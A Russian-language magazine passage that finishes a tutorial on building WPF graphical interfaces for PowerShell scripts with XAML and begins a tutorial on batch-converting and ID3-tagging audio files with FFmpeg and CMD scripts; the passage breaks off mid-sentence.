Windows Presentation Foundation (WPF).


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
          СЕКРЕТЫ
       POWERSHELL
              СОЗДАЕМ ГРАФИЧЕСКИЙ ИНТЕРФЕЙС
                             ДЛЯ СЦЕНАРИЕВ





ПОСТРОЕНИЕ GUI С ПОМОЩЬЮ WINDOWS PRESENTATION
FOUNDATION
При использовании WPF графический интерфейс описывается с помощью
базирующегося на XML языка разметки XAML (Extensible Application Markup
Language). Таким образом, дизайн интерфейса отделяется от логики сце‐
нария, работающего с этим интерфейсом.
  Для работы с  объектами WPF в PowerShell  нужно  загрузить  сборку
PresentationFramework:


PS C:\Users\andrv> Add-Type -AssemblyName PresentationFramework

Создадим  сначала  простейшее  диалоговое  окно  без  элементов  раз‐
мером 300 на 200 пикселов и заголовком «Форма WPF». На первом шаге
с помощью here-string создадим строку $xaml с XML-разметкой, содержащей
один тег <Window/> с атрибутами Width, Height и Title, и преобразуем эту
строку в объект XML:


PS C:\Users\andrv> [xml]$xaml = @"
>> <Window
>>     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/
presentation"
>>     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
>>     x:Name="Window" Title="Форма WPF" Height="200" Width="300"
>> />
>> "@

Атрибут xmlns здесь определяет пространство имен, содержащее имена
элементов и атрибутов, которые можно использовать в разметке Windows
Presentation Foundation. Префикс x перед атрибутом указывает на то, что дан‐
ный атрибут относится к данному пространству имен.
   Создадим теперь экземпляр класса XmlNodeReader, передав ему объект
$xaml в качестве аргумента. Полученный объект сохраним в переменной
$reader:


PS C:\Users\andrv> $reader = (New-Object System.Xml.XmlNodeReader
$xaml)

Объект, соответствующий диалоговому окну, создается с помощью статичес‐
кого метода Load() класса XamlReader. В этот метод передается объект
$reader:


PS C:\Users\andrv> $window = [Windows.Markup.XamlReader]::Load(
$reader)

Теперь окно можно отобразить на экране с помощью метода ShowDialog.


PS C:\Users\andrv> $window.ShowDialog()





                              Пустая форма WPF

При этом работа оболочки PowerShell приостановится, для ввода следующей
команды нужно закрыть наше диалоговое окно. Добавим в нашу форму эле‐
мент <Grid>, задающий сетку для размещения других элементов управления.


PS C:\Users\andrv> [xml]$xaml = @"
>> <Window
>>     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/
presentation"
>>     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
>>     x:Name="Window" Title="Форма WPF" Height="200" Width="300"
>> >
>>     <Grid x:Name="Grid">
>>         <Grid.RowDefinitions>
>>             <RowDefinition Height="Auto"/>
>>             <RowDefinition Height="Auto"/>
>>         </Grid.RowDefinitions>
>>         <Grid.ColumnDefinitions>
>>             <ColumnDefinition Width="Auto"/>
>>             <ColumnDefinition Width="Auto"/>
>>         </Grid.ColumnDefinitions>
>>     </Grid>
>> </Window>
>> "@

Сетка не отображается на экране, поэтому внешний вид главной формы
(диалогового окна) не изменится, форма останется пустой.
Поместим теперь на форму надпись (тег <Label> с именем Message) и кнопку
(тег <Button> с именем ChangeMessage). Надписи в этих элементах задаются
с помощью атрибута Content, расположение элемента в ячейке сетки опре‐
деляется с помощью атрибутов Grid.Column и Grid.Row.


PS C:\Users\andrv> [xml]$xaml = @"
>> <Window
>>     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/
presentation"
>>     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
>>     x:Name="Window" Title="Форма WPF" Height="200" Width="300"
>> >
>>     <Grid x:Name="Grid">
>>         <Grid.RowDefinitions>
>>             <RowDefinition Height="Auto"/>
>>             <RowDefinition Height="Auto"/>
>>         </Grid.RowDefinitions>
>>         <Grid.ColumnDefinitions>
>>             <ColumnDefinition Width="Auto"/>
>>             <ColumnDefinition Width="Auto"/>
>>         </Grid.ColumnDefinitions>
>>         <Label x:Name="Message"
>>             Content="Привет!"
>>             Grid.Column="0"
>>             Grid.Row="0"
>>         />
>>         <Button x:Name="ChangeMessage"
>>             Content="Нажми!"
>>             Grid.Column="1"
>>             Grid.Row="1"
>>         />
>>     </Grid>
>> </Window>
>> "@

Отобразим форму на экране:


C:\Users\andrv> $reader = (New-Object System.Xml.XmlNodeReader $xaml)
PS C:\Users\andrv> $window = [Windows.Markup.XamlReader]::Load(
$reader)
PS C:\Users\andrv> $window.ShowDialog()





                WPF-форма с элементами управления

С помощью команды Set-Content поместим XAML-разметку для нашей фор‐
мы в файл wpf_test.xaml:


PS C:\Users\andrv> @"
>> <Window
>>     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/
presentation"
>>     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
>>     x:Name="Window" Title="Форма WPF" Height="200" Width="300"
>> >
>>     <Grid x:Name="Grid">
>>         <Grid.RowDefinitions>
>>             <RowDefinition Height="Auto"/>
>>             <RowDefinition Height="Auto"/>
>>         </Grid.RowDefinitions>
>>         <Grid.ColumnDefinitions>
>>             <ColumnDefinition Width="Auto"/>
>>             <ColumnDefinition Width="Auto"/>
>>         </Grid.ColumnDefinitions>
>>         <Label x:Name="Message"
>>             Content="Привет!"
>>             Grid.Column="0"
>>             Grid.Row="0"
>>         />
>>         <Button x:Name="ChangeMessage"
>>             Content="Нажми!"
>>             Grid.Column="1"
>>             Grid.Row="1"
>>         />
>>     </Grid>
>> </Window>
>> "@ | Set-Content -Path ./wpf_test.xaml -Encoding UTF8

Теперь для отображения формы мы можем прочитать ее разметку из файла:


PS C:\Users\andrv> [xml]$xaml = Get-Content -Path .\wpf_test.xaml
-Encoding UTF8
PS C:\Users\andrv> $reader = (New-Object System.Xml.XmlNodeReader
$xaml)
PS C:\Users\andrv> $window = [Windows.Markup.XamlReader]::Load(
$reader)

Осталось добавить форме функциональность, создав обработчики нужных
событий, возникающих на элементах управления. Это делается практически
так же, как и при использовании WinForms, за исключением того, что нам нуж‐
но предварительно создать объекты‑переменные, соответствующие элемен‐
там управления загруженной формы.
   Напомним, что для тегов элементов управления мы задавали атрибут
Name из пространства имен XAML-разметки для WPF:


<Label x:Name="Message"
   ...
/>
<Button x:Name="ChangeMessage"
   ...
/>

По значению атрибута Name с помощью метода $window.FindName() получим
ссылки на соответствующие элементы управления:


PS C:\Users\andrv> $messageLabel = $window.FindName("Message")
PS C:\Users\andrv> $changeButton = $window.FindName("ChangeMessage")

Пусть, как и в примере с WinForms, при нажатии кнопки текст надписи в нашей
форме должен  измениться на  «Пока!». Для  этого зададим  обработчик
события Click на кнопке с помощью метода Add_Click:


PS C:\Users\andrv> $changeButton.Add_Click({$messageLabel.Content=
'Пока!'})

Теперь форму можно отобразить на экране и проверить результат нажатия
кнопки.


PS C:\Users\andrv> $window.ShowDialog()





       Изменение содержимого элемента управления на WPF-форме

Итак, при работе с графическим интерфейсом с помощью WPF нужно выпол‐
нить следующие шаги:
 1. Создать XAML-файл с описанием интерфейса.
 2. Подключить сборку PresentationFramework.
 3. Создать объект, соответствующий форме, загрузив ее описание в фор‐
   мате XAML.
 4. Определить  переменные   (объекты),   соответствующие   элементам
   управления в форме.
 5. Написать блоки кода для обработчиков событий и привязать их к объ‐
   ектам, созданным на предыдущем шаге.
 6. Отобразить главную форму на экране.

Таким образом, при работе с WPF мы можем создавать и изменять дизайн
интерфейса независимо от его функционала. Кроме того, XAML-описание
формы не зависит от специфики PowerShell, как это было в случае интерфей‐
са на базе WinForms, поэтому вариантов выбора визуального конструктора
для построения форм становится больше.
   Кроме  платных   специализированных  сред   разработки  сценариев
PowerShell (Sapien PowerShell Studio, PowerShell GUI Designer), можно вос‐
пользоваться бесплатной платформой Microsoft — Visual Studio Community
Edition. Скачать  Visual Studio можно с  сайта Microsoft. Для  построения
интерфейса формы и получения ее XAML-разметки нужно при запуске Visual
Studio создать новый проект «Приложение WPF (.NET Framework)».





                Создание WPF-приложения в Visual Studio

При создании такого приложения можно настроить дизайн формы с помощью
графического конструктора.





                   Конструктор для WPF-форм в Visual Studio

В результате будет автоматически сформирован XAML-файл, с которым мож‐
но работать в PowerShell.


ИТОГИ
Добавить графический интерфейс к сценариям Windows PowerShell можно
с помощью библиотек Windows Forms (WinForms) или Windows Presentation
Foundation (WPF). При использовании WinForms элементы интерфейса соз‐
даются и  настраиваются  непосредственно в коде PowerShell. Средства
для  визуального  редактирования  подобных форм  встроены в  профес‐
сиональные среды разработки сценариев PowerShell.
  При работе с WPF дизайн интерфейса, описываемый с помощью разметки
в формате XAML, не связан с кодом PowerShell. Создавать и редактировать
WPF-формы можно с помощью визуального конструктора в бесплатной вер‐
сии Microsoft Visual Studio.
ТРЮКИ





                                                                        Игорь Орещенков
                                                                                            r0bur@mail.ru

 МУЗЫКА
     В ПАКЕТЕ

                    АВТОМАТИЧЕСКИ
         КОНВЕРТИРУЕМ И АННОТИРУЕМ
             АУДИОФАЙЛЫ В WINDOWS




Любители музыки часто сталкиваются с необходимостью
навести порядок в собственной коллекции аудиофайлов.
А если аудиофайлов очень много, это превращается в проб‐
лему. В сегодняшней статье мы разберем способ автомати‐
ческой   конвертации  и   аннотирования   аудиофайлов
в Windows с помощью утилиты FFmpeg и CMD-сценариев.


Наступила весна, приближается лето, и хочется проводить свободное время
на природе, вдыхая свежий воздух и слушая голоса птиц. Если же наскучит
лесная идиллия, всегда можно разнообразить отдых любимой музыкальной
композицией, аудиокнигой, курсами иностранного языка или общеобразова‐
тельными лекциями. Замечено, что аудиоплееры, будь то отдельные устрой‐
ства или приложения для смартфона, гораздо лучше работают с аудиокол‐
лекциями, файлы которых содержат сведения об альбомах и треках в них.
   Лицензионные материалы, как правило, сопровождаются всеми необ‐
ходимыми атрибутами. Но есть еще любительские и диктофонные записи,
оцифровки грампластинок и аудиокассет, свободно распространяемые ком‐
позиции, которые надо упорядочить и подписать. А еще желательно привести
параметры файлов в соответствие с хранящимися в них аудиоданными. Нап‐
ример,  оцифрованную  пластинку  «Мелодия»  с  маркировкой  «Моно»
и записью бардовских песен, исполнявшихся полвека назад на концерте
в каком‑нибудь провинциальном доме культуры, можно сохранить в формате
FLAC для истории, но нет никакого практического смысла записывать ее
на портативный проигрыватель в стереоформате с частотой дискретиза‐
ции 48 кГц и скоростью потока 320 Кбит/с.
  Для конвертации аудиофайлов и редактирования их тегов есть множество
программ, как платных, так и свободно распространяемых, с интерфейсами
различной степени изящества и удобства. Но большинство из них — оболоч‐
ки вокруг одного‑двух проектов с открытым исходным кодом, в которых
как раз и реализована вся необходимая функциональность. Как правило,
в основе лежит утилита командной строки, обладающая широким набором
возможностей, а графическая оболочка открывает доступ к их подмножеству,
отобранному по принципу решения отдельной пользовательской проблемы.
   Недавно  я  занимался  пакетной  обработкой  изображений, для  чего
использовал программу ImageMagick. И случайно обнаружил, что в состав ее
дистрибутива входит утилита FFmpeg, которая, как известно, умеет выполнять
множество операций над медиафайлами. Почему бы не воспользоваться ею
для  конвертации и  оснащения  тегами  файлов моей  аудиоколлекции?
Но запускать утилиту командной строки и указывать множество параметров
для каждого MP3-файла довольно утомительно, и очевидно, что процесс
надо автоматизировать.
  Из всего богатого спектра интерпретируемых языков и систем прог‐
раммирования, с помощью которых можно было бы легко реализовать эту
затею, я остановился на самом примитивном инструменте — языке сценари‐
ев  командного  процессора  Windows. Почему?  Во‑первых, он  имеется
на любой Windows-платформе, от W2K до W11. Во‑вторых, он напрямую пред‐
назначен для автоматизации рутинных операций с файлами. А в‑третьих, он
имеет  встроенную  сопроводительную  документацию —  чтобы  получить
справку, не придется даже открывать браузер.
   Итак,  сформулируем  задачу.  Даны  аудиоальбомы,  представленные
наборами аудиофайлов. Требуется добавить к этим файлам изображение
обложки альбома и  описательных тегов из  текстового  файла, а  также
при необходимости конвертировать эти файлы в формат MP3 с установкой
требуемых  параметров  аудиоданных. Для решения задачи  попытаемся
использовать программу FFmpeg и язык сценариев командной оболочки
CMD.EXE, пока корпорация‑разработчик не отправила его на свалку истории
вслед за Paint’ом.


ИЗУЧЕНИЕ ВОЗМОЖНОСТЕЙ FFMPEG
Начать решение задачи я решил с изучения возможностей FFmpeg в инте‐
ресующей меня области. В том, что она справится с конвертацией аудиофай‐
лов из одного формата в другой, я почти не сомневался. Но сумеет ли она
прикрепить  изображение  обложки  и  добавить  информационные  теги
в результирующие файлы?
  Мои сомнения были развеяны статьей Стефана Шмитца «Получение
и установка метатегов ID3 с помощью FFmpeg», в которой автор привел при‐
меры интересующих меня команд. Основная идея заключается в том, что зна‐
чения тегов указываются программе FFmpeg в виде параметров:


-metadata НазваниеТега="ЗначениеТега"

Более того, в статье имеется пример использования  текстового файла
в качестве источника тегов. К сожалению, для этого нужно создавать отдель‐
ные текстовые файлы с тегами для каждого аудиофайла, тогда как гораздо
удобнее все сведения о содержимом аудиоальбома держать в одном тексто‐
вом файле.



Указывать полный путь к исполняемому файлу FFmpeg в командной строке
крайне неудобно. Обычно при установке программы предлагают включить
путь в системную переменную окружения PATH, но я предпочитаю ее
не засорять. Вместо этого можно поместить в папку, уже присутствующую
в этой переменной, командный файл ffmpeg.cmd следующего содержания:


 @"%ProgramFiles%\ImageMagick-7.1.0-Q8\ffmpeg.exe" %*


Символ @ подавляет эхо‑печать командной строки, а вместо сочетания %*
при выполнении будут подставлены все параметры, переданные сценарию
ffmpeg.cmd. Таким образом, использовать FFmpeg из командной строки
для конвертации файла SRC\sample.wav в TGT\sample.mp3 можно так:


 ffmpeg.cmd -i SRC\sample.wav TGT\sample.mp3




Ответ на вопрос, можно ли с помощью FFmpeg снабдить MP3-файл изоб‐
ражением обложки, был практически моментально получен в поисковой сис‐
теме. Оказалось, что с точки зрения FFmpeg изображение обложки является
для MP3-файла видеопотоком и, чтобы склеить его с аудиоданными, надо
воспользоваться командой вида


ffmpeg -i SRC\audio.mp3 -i SRC\cover.jpg -map 0 -map 1 -id3v2_version
 3 -metadata:s:v title="Album cover" TGT\audio.mp3

С помощью опций -map источники данных из входных файлов отображаются
в потоки выходного файла. Первая опция определяет первый поток, ее
параметр 0 говорит о  том,  что надо  использовать  первый  указанный
с помощью опции -i источник, в приведенном примере это аудиоданные
из  файла SRC\audio.mp3.  Вторая опция  определяет  второй  поток, ее
параметр 1 говорит, что надо использовать второй указанный с помощью
опции -i источник — изображение из файла SRC\cover.jpg.





  Слияние файлов с аудиоданными и изображением в аудио- и видеопо‐
  токи файла‑контейнера MP3

По умолчанию FFmpeg  автоматически  кодирует потоки в  соответствии
со своими предустановками так, чтобы они отвечали формату выходного
файла (определяется по расширению). Например, аудио она конвертирует
кодеком LAME  с  частотой  дискретизации  44  100  Гц  и  скоростью
потока 128 Кбит/с, а изображение преобразует в формат PNG. Если манипу‐
ляции с обложкой еще можно простить, то описанные действия со звуком
меломаны могут воспринять как личное оскорбление. К счастью, можно зап‐
ретить программе выполнять какие бы то ни было преобразования, указав
в командной строке опцию -c copy. Или запретить преобразовывать только
аудио, конкретизировав опцию так: -c:a copy.
   Опция -id3v2_version 3 требует использовать версию 2.3 тегов ID3.
Без нее записанное в выходной файл изображение не будет отыскиваться
и демонстрироваться проигрывателями. Наоборот, опция -metadata:s:v
title="Album cover", назначающая потоку ([b]s[/b]tream) с видеоданными
([b]v[/b]ideo) атрибут title со значением "Album  cover", служит только
декоративной цели.


             INFO

                              Теги   ID3   должны   назначаться   контейнеру
                  MP3 в целом, а не отдельному содержащемуся
                        в нем потоку. Поэтому для них опция -metadata
                            используется без дополнительных спецификато‐
                         ров.


В моей аудиоколлекции наряду с музыкальными произведениями обнаружи‐
лись аудиоподкасты, записанные с высоким качеством. Восприятие этих
материалов на слух не страдает, если понизить  частоту  дискретизации
(sample rate) до 22 кГц и свести стереозвук в монодорожку. Конкретизировать
параметры  преобразования  аудиопотока  программе FFmpeg  можно  с
помощью таких опций:


... -c:a libmp3lame -ar 22050 -ac 1 ...

Опция -c предписывает выполнять обработку аудиопотока кодеком Lame
MP3, опция -ar задает  частоту дискретизации аудиопотока 22 050 Гц,
а опция -ac требует свести звук в одну дорожку. После такого преобразова‐
ния размер MP3-файлов значительно уменьшился. Допустимые значения
частоты дискретизации в порядке убывания качества (Гц): 48 000, 44 100,
32 000, 24 000, 22 050, 16 000, 11 025, 8000.


             INFO

                          Управлять качеством звукового потока можно и с
                   помощью  опции,  позволяющей  задать  мак‐
                        симальную скорость передачи данных  (bitrate).
                         Например, для ограничения скорости до 96 Кбит/
                        с надо указать: -b:a 96k.





                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
   МУЗЫКА В ПАКЕТЕ

                  АВТОМАТИЧЕСКИ КОНВЕРТИРУЕМ
          И АННОТИРУЕМ АУДИОФАЙЛЫ В WINDOWS





ИЗУЧЕНИЕ ВОЗМОЖНОСТЕЙ CMD-СЦЕНАРИЕВ
Язык CMD-сценариев базируется на крайне ограниченном языке пакетных
batch-файлов, который изначально использовался только для выполнения
одной и той же линейной последовательности команд операционной сис‐
темы. Но со временем инструкция FOR была расширена для того, чтобы с ее
помощью можно было обрабатывать текстовые файлы, выполнять синтакси‐
ческий разбор строк и присваивать переменным сценария значения на осно‐
ве обнаруженных фрагментов.


Подробную справку о возможностях инструкции FOR выгрузит в текстовый
файл help-for.txt такая последовательность команд:


 CHCP 1251
 HELP FOR > help-for.txt
 CHCP 866


Команда CHCP  устанавливает кодировку символов, которая используется
в сеансе командной строки. По умолчанию  действует кодировка CP866
(DOS), с которой не умеет работать штатный текстовый редактор «Блокнот».
Чтобы читать полученный текстовый файл в блокноте, надо перед фор‐
мированием файла установить кодировку CP1251 (Windows). В результате
изучать документацию можно с помощью команды


 notepad.exe help-for.txt




Разберем принцип работы языка сценариев с текстовыми файлами на сле‐
дующем  примере. Предположим,  у нас есть CSV-файл employees.csv
со следующим содержимым в кодировке CP1251:


#      ШТАТНОЕ РАСПИСАНИЕ
#      ООО «Админ на час»
# ТабельныйНомер;Фамилия;Имя;Отчество;Должность;Оклад


1;Иванов;Иван;Иванович;директор;300
2;Петров;Петр;Петрович;главбух;200
3;Сидоров;Сидор;Сидорович;сисадмин;100

Применим к нему команду test-for.cmd employees.csv, где файл test-
for.cmd содержит следующий сценарий:


@ECHO OFF
CHCP 1251 > NUL:
FOR /F "eol=# tokens=2,3,5 delims=;" %%I IN (%1) DO ECHO %%J %%I - %%
K
CHCP 866 > NUL:

Ключ /F инструкции FOR заставляет ее обрабатывать содержащиеся в тексто‐
вом файле строки с именем, переданным в качестве первого параметра
командной строки, в соответствии с описанием структуры текстового файла,
которое заключено в кавычки. Элемент eol этого описания задает символ (он
может быть только один), которым начинается однострочный комментарий (в
приведенном примере это символ решетки #). Такой выбор позволяет исклю‐
чить из обработки первые три строки файла employees.csv. Пустые строки
в обработке тоже не участвуют, поэтому и его четвертая строка будет про‐
пущена.
  В элементе tokens через запятую перечисляются порядковые номера
интересующих разработчика информационных полей, значения которых раз‐
деляются в обрабатываемой строке символами‑разделителями, указанными
в элементе delims. В приведенном примере это второе, третье и пятое поле,
что соответствует фамилии, имени и должности. В качестве разделителя
будет использован символ точка с запятой, но при необходимости в элементе
delims можно указать один за другим сразу несколько символов‑разделите‐
лей.


             INFO

                            Несколько идущих подряд разделителей считают‐
                        ся одним, а стоящий в самом начале строки раз‐
                       делитель игнорируется. Последнее свойство инс‐
                           трукции FOR  позволит  организовать  хранение
                      и  обработку двух списков в одном  текстовом
                           файле.


После описания структуры в инструкции FOR указывается имя переменной,
которой присвоится значение первого поля обработанной строки. В при‐
веденном примере фамилия будет записана в переменную %%I. Значения
остальных полей будут присвоены переменным, следующим после указанной
в алфавитном порядке. В рассматриваемом примере фамилия и должность
попадут в переменные %%J и %%K соответственно.
  На каждой итерации цикла FOR переменные инициализируются значени‐
ями соответствующих полей, после чего они могут использоваться в команде,
которая записывается в инструкции FOR после слова DO. В приведенном при‐
мере  это  команда  ECHO,  печатающая  строку  вида  "Имя  Фамилия  -
Должность". В результате обработки файла employees.csv на экран будут
выведены строки:



  Иван Иванов - директор
  Петр Петров - главбух
  Сидор Сидоров - сисадмин



             INFO

                           Команды CHCP в сценарии test-for.cmd нуж‐
                    ны только для того, чтобы корректно отображался
                          текст в Windows-кодировке, а конструкции ... >
                   NUL: использованы для подавления вывода их
                        информационных     сообщений    "Текущая
                   кодовая страница такая-то".


Модернизации подвергся и механизм вызова подпрограмм. Если в BAT-сце‐
нариях инструкция CALL позволяла только передать управление находящему‐
ся в другом файле BAT-сценарию с последующим возвратом, то в CMD-сце‐
нариях появилась возможность временной передачи управления  внутри
выполняющегося сценария. К сожалению, после перехода по метке отсутс‐
твует возможность досрочного возврата в точку вызова, то есть подпрог‐
раммой считается код от метки до конца файла.
   Работу подпрограммы рассмотрим на исправленном сценарии, который
не только выводит информацию о сотрудниках, но и подсчитывает фонд
заработной платы.


@ECHO OFF
SET TOTAL=0
CHCP 1251 > NUL:
FOR /F "eol=# tokens=2,3,5,6 delims=;" %%I IN (%1) DO CALL :CALCULATE
 %%I %%J %%K %%L
ECHO *** Фонд зарплаты: %TOTAL% ***
CHCP 866 > NUL:
SET TOTAL=
GOTO :EOF
:CALCULATE
ECHO %2 %1 - %3 (%4)
SET /A TOTAL=%TOTAL%+%4

Поскольку теперь на каждой итерации цикла требуется выполнять не одну
команду, а несколько, то удобно в операторе FOR заменить команду печати
ECHO командой вызова подпрограммы CALL. После слова CALL указывается
метка строки, с которой начинается подпрограмма (в приведенном примере
это :CALCULATE), а дальше следуют аргументы, значения которых в подпрог‐
рамме будут присвоены параметрам %1, %2, %3 и так далее по количеству
аргументов. В приведенном примере их четыре: Фамилия, Имя, Должность
и Оклад.
  В подпрограмме :CALCULATE выполняются все необходимые для обработ‐
ки полей информационной  строки  действия.  Во‑первых, команда ECHO
печатает информацию о сотруднике, дополненную величиной его оклада.
Во‑вторых, инструкция SET (тоже модернизированная и дополненная приз‐
наком выполнения арифметических операций /A)  увеличивает значение
переменной TOTAL, инициализированной нулевым значением, на величину
оклада сотрудника.


           WARNING

                       Как бы тебе ни хотелось украсить листинг сце‐
                        нария, ни в коем случае не вставляй пробелы
                        в инструкции SET между именем переменной,
                          знаком равенства и присваиваемым значением.
                   В этой инструкции каждый пробел имеет зна‐
                        чение!


Когда цикл FOR завершит обработку информационных строк файла со штат‐
ным расписанием, следующей командой ECHO будет распечатан общий фонд
зарплаты, после чего команда SET удалит переменную TOTAL. Одна из важ‐
нейших ролей в этом заключительном блоке отведена команде безусловного
перехода GOTO, которая  служит барьером между основной программой
и подпрограммой. Она передает управление на виртуальный конец сценария,
которому соответствует предопределенная метка :EOF, в результате чего
сценарий завершает свою работу.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
   МУЗЫКА В ПАКЕТЕ

                  АВТОМАТИЧЕСКИ КОНВЕРТИРУЕМ
          И АННОТИРУЕМ АУДИОФАЙЛЫ В WINDOWS





РАЗРАБОТКА ПРОТОТИПА КОМАНДНОГО СЦЕНАРИЯ
Теперь, когда возможности FFmpeg и языка командных сценариев проясни‐
лись, можно приступать к решению нашей задачи — разработке сценария
для  конвертации  и  назначения  ID3-тегов  аудиофайлам  из  коллекции.
Для начала решим, как будет храниться информация о тегах.
   Аудиофайлы обычно существуют не сами по себе, а сгруппированы в аль‐
бомы, которые издатели записывают на один информационный носитель:
компакт‑диск, виниловую пластинку и прочее. Поэтому в одном информа‐
ционном текстовом файле будем хранить теги для одного такого альбома.
Если проанализировать множество ID3-тегов, то можно выделить в нем две
категории: теги, которые относятся ко всему альбому в целом (например,
название альбома и исполнитель  альбома), и  теги, которые  относятся
к отдельному треку (номер трека на носителе, название трека, исполнитель
трека).
   Чтобы не  дублировать для  каждого  аудиофайла  «альбомные»  теги,
запишем их один раз в заголовке информационного файла. Теги для отдель‐
ных треков удобно хранить в строках текстового файла с разделителями.
В качестве разделителя будем использовать символ, встретить который
в значениях тегов маловероятно. Я выбрал символ тильда ~. А для альбомных
тегов, которые естественно представлять в виде пар "ТЕГ=ЗНАЧЕНИЕ", было
решено использовать в качестве разделителя знак равенства =.
   Вырисовывается следующая структура информационного файла:


ALBUM=Название альбома
ARTIST=Исполнитель альбома
1~Название первого трека~Исполнитель первого трека
2~Название второго трека~Исполнитель второго трека
...

Ориентируясь на разработанную структуру, набросаем прототип командного
сценария, который будет ее использовать для обработки аудиофайлов.


@ECHO OFF
REM ===================
REM Основная программа.
REM ===================
CHCP 65001 > NUL:
SET ID3TAGS=SRC\id3tags.txt
SET ALBUM_TITLE=
SET ALBUM_ARTIST=
FOR /F "eol=~ tokens=1,2* delims==" %%I IN (%ID3TAGS%) DO CALL :
PROCESSING header %%I "%%J"
ECHO Альбом......... %ALBUM_TITLE%
ECHO Исполнитель.... %ALBUM_ARTIST%
FOR /F "eol== tokens=1,2,3 delims=~" %%I IN (%ID3TAGS%) DO CALL :
PROCESSING body %%I "%%J" "%%K"
SET ALBUM_TITLE=
SET ALBUM_ARTIST=
CHCP 866 > NUL:
GOTO :EOF
REM ==============================
REM Подпрограмма обработки записи.
REM ==============================
:PROCESSING
IF "%1"=="header" GOTO :HEADER
IF "%1"=="body" GOTO :BODY
ECHO *** Ошибка: неизвестный способ обработки "%1". ***
GOTO :EOF
REM ------------------------------------
REM Обработка записи из заголовка файла.
REM ------------------------------------
:HEADER
SHIFT
IF "%1"=="ALBUM" SET ALBUM_TITLE=%2
IF "%1"=="ARTIST" SET ALBUM_ARTIST=%2
GOTO :EOF
REM -------------------------------
REM Обработка записи из тела файла.
REM -------------------------------
:BODY
SHIFT
ECHO DEBUG: %1 %2 %3

Поскольку для тегов предпочтительно использовать кодировку Unicode, то
все текстовые файлы, как со сценарием, так и со значениями тегов, должны
быть сохранены в формате UTF-8. В соответствии с этим для сеанса коман‐
дной строки устанавливается кодовая страница 65001. Предполагается, что
исходные аудиофайлы будут храниться в подкаталоге SRC, а преобразован‐
ные файлы — записываться в подкаталог TGT текущего каталога. Информация
о тегах будет храниться вместе с исходными файлами в текстовом файле
SRC\id3tags.txt описанной выше структуры.



При сохранении текстовых файлов в формате UTF-8 обращай внимание, что‐
бы они не предварялись маркером последовательности байтов BOM. Коман‐
дный процессор не умеет его правильно обрабатывать, в результате чего он
не распознает первую команду @ECHO OFF и при работе сценария на экран
выводится много «мусора». В крайнем случае можно сделать первую строку
сценария пустой, но и тогда его вывод будет начинаться с сообщения:


 "я╗┐" не является внутренней или внешней
 командой, исполняемой программой или пакетным файлом.




Поскольку в информационном файле присутствуют два блока разной струк‐
туры, он будет обрабатываться в два прохода двумя циклами FOR. Первый
цикл присвоит значения альбомных тегов переменным окружения сценария
с тем, чтобы их можно было в дальнейшем использовать для каждого ауди‐
офайла. Второй цикл на каждой итерации будет запускать FFmpeg для обра‐
ботки аудиофайла.
  И здесь нужно найти метод, который позволит различать информационные
строки первого и второго типов. Это можно сделать разными способами. Я
решил использовать символ — разделитель полей одного блока в качестве
признака комментария для другого блока и в начало каждой информацион‐
ной строки добавить символ‑разделитель, после чего структура информа‐
ционного файла приняла такой вид:


=ALBUM=Название альбома
=ARTIST=Исполнитель альбома
~1~Название первого трека~Исполнитель первого трека
~2~Название второго трека~Исполнитель второго трека
...

После этого первый цикл воспринимает строки второго блока как коммента‐
рии, а второй цикл так же относится к строкам первого блока.
   Средства работы с подпрограммами в языке CMD-сценариев довольно
ограниченны. Из‑за отсутствия инструкции досрочного возврата из подпрог‐
раммы пришлось моделировать в одной подпрограмме работу нескольких
виртуальных  подпрограмм. Для  этого через  аргумент  инструкции CALL
передается имя виртуальной подпрограммы ("header" или "body"), которое
анализируется в начале настоящей подпрограммы (:PROCESSING). После это‐
го выполняется переход к блоку инструкций вызванной виртуальной подпрог‐
раммы (на метку :HEADER или :BODY). Чтобы исключить ставшее ненужным
имя подпрограммы из списка полученных параметров, виртуальные подпрог‐
раммы начинаются с инструкции SHIFT.
   Если сейчас выполнить приведенный прототип сценария, то на экране
отобразятся следующие строки:


Альбом......... "Название альбома"
Исполнитель.... "Исполнитель альбома"
DEBUG: 1 "Название первого трека" "Исполнитель первого трека"
DEBUG: 2 "Название второго трека" "Исполнитель второго трека"

Значит,  разбор  текстового  файла со  значениями  тегов  работает  так,
как задумано, и можно переходить к реализации обработки аудиофайлов
с помощью FFmpeg.


СЦЕНАРИЙ ПАКЕТНОЙ ОБРАБОТКИ АУДИОФАЙЛОВ
Для выполнения реальных операций над файлами надо в прототипе сценария
заменить отладочный вывод ECHO DEBUG... на блок инструкций, которые эти
операции будут выполнять. Я оформил этот блок следующим образом:


SET MP3FN=%1.mp3
IF NOT EXIST SRC\%MP3FN% SET MP3FN=0%1.mp3
IF NOT EXIST SRC\%MP3FN% SET MP3FN=00%1.mp3
IF NOT EXIST SRC\%MP3FN% GOTO :BODY_FNF
SET SRCFN="SRC\%MP3FN%"
SET TGTFN="TGT\%MP3FN%"
ECHO Конвертация файла %SRCFN% -^> %TGTFN%
%FFMPEG% -i %SRCFN% -i %COVER% -map 0 -map 1 -c:a libmp3lame -ar %FQ%
 -b:a %BR% -ac %AC% ^
    -f mp3 -id3v2_version 3 -map_metadata -1 ^
    -metadata album=%ALBUM_TITLE% -metadata album_artist=%
ALBUM_ARTIST% ^
    -metadata track="%1" -metadata title=%2 -metadata artist=%3 ^
    -metadata:s:v title="Album cover" %TGTFN%
GOTO :EOF
:BODY_FNF
ECHO *** Ошибка: не найден файл для трека №%1. ***

Короткое имя файла по его порядковому номеру формируется и записывает‐
ся в переменную MP3FN первой инструкцией SET. В моих коллекциях ауди‐
офайлы хранятся под своими порядковыми номерами в альбомах: 01.mp3,
02.mp3, 03.mp3,  ..., 10.mp3, 11.mp3... В сценарии для универсальности я
предположил, что номер в имени файла может не содержать ведущего нуля:
1.mp3, 2.mp3 и так далее. Чтобы автоматически обрабатывались файлы
вплоть до трехразрядных номеров, дальше следуют инструкции IF, добав‐
